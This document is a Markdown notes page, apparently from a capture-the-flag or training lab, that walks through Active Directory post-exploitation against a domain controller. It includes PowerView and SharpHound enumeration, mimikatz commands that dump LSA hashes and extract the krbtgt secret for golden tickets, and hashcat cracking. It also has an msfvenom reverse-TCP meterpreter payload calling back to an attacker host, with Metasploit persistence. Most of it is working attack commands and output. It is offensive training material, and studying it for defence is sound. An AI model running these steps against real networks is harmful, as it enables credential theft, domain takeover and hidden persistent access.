# Post exploitation basics

![Bloodhound](../../_static/images/bloodhound.png)

## Attack tree

```text
1 Enumeration with Powerview
2 Enumeration with Bloodhound
3 Dumping hashes with mimikatz
4 Golden ticket attacks with mimikatz
6 Maintaining Access
```

## Examples

### Enumeration with Powerview

ssh into machine:

    ssh Administrator@<MACHINE-IP>
    Administrator@<MACHINE-IP>'s password: 

    Microsoft Windows [Version 10.0.17763.737]

Start Powershell: `-ep` bypasses the execution policy of powershell

    controller\administrator@DOMAIN-CONTROLL C:\Users\Administrator>powershell -ep bypass
    Windows PowerShell
    Copyright (C) Microsoft Corporation. All rights reserved.

Start PowerView:

    PS C:\Users\Administrator> . .\Downloads\PowerView.ps1
    PS C:\Users\Administrator> cd .\Downloads

Enumerate the domain users:

    PS C:\Users\Administrator\Downloads> Get-NetUser | select cn
    
    --
    Administrator
    Guest
    krbtgt
    Machine-1
    Admin2
    SQL Service
    POST{P0W3RV13W_FTW}
    sshd

Enumerate the domain groups:

    PS C:\Users\Administrator\Downloads> Get-NetGroup -GroupName *admin*
    Administrators
    Hyper-V Administrators
    Storage Replica Administrators
    Schema Admins
    Enterprise Admins
    Domain Admins
    Key Admins
    Enterprise Key Admins
    DnsAdmins

Enumerate shares:

    PS C:\Users\Administrator\Downloads> Invoke-ShareFinder
    \\Domain-Controller.CONTROLLER.local\ADMIN$     - Remote Admin
    \\Domain-Controller.CONTROLLER.local\C$         - Default share
    \\Domain-Controller.CONTROLLER.local\IPC$       - Remote IPC
    \\Domain-Controller.CONTROLLER.local\NETLOGON   - Logon server share
    \\Domain-Controller.CONTROLLER.local\Share      -
    \\Domain-Controller.CONTROLLER.local\SYSVOL     - Logon server share

Enumerate operating systems running inside the network:

    PS C:\Users\Administrator\Downloads> Get-NetComputer -fulldata | select operatingsystem*
    
    operatingsystem                  operatingsystemversion
    ---------------                  ----------------------
    Windows Server 2019 Standard     10.0 (17763)
    Windows 10 Enterprise Evaluation 10.0 (18363)
    Windows 10 Enterprise Evaluation 10.0 (18363)

### Enumeration with Bloodhound

    powershell -ep bypass 
    . .\Downloads\SharpHound.ps1
    Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip

Transfer the loot to attackerbox and load in bloodhound. Map the network.

### Dumping hashes with mimikatz

    cd Downloads && mimikatz.exe
    privilege::debug
    lsadump::lsa /patch
    hashcat -m 1000 <hash.text> usr/share/wordlists/rockyou.txt

### Golden ticket attacks with mimikatz

    cd Downloads && mimikatz.exe
    privilege::debug
    lsadump::lsa /inject /name:krbtgt

### Maintaining Access

    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o shell.exe

Transfer the payload from your attacker machine to the target machine and `use exploit/multi/handler`,
then execute the binary this will give a meterpreter shell back in metasploit. Background it.

    use exploit/windows/local/persistence
    set session 1

## Tools

* [Bloodhound](https://github.com/BloodHoundAD/BloodHound)

```text
# apt install bloodhound neo4j
# neo4j console
```

* [Mimikatz](https://github.com/gentilkiwi/mimikatz)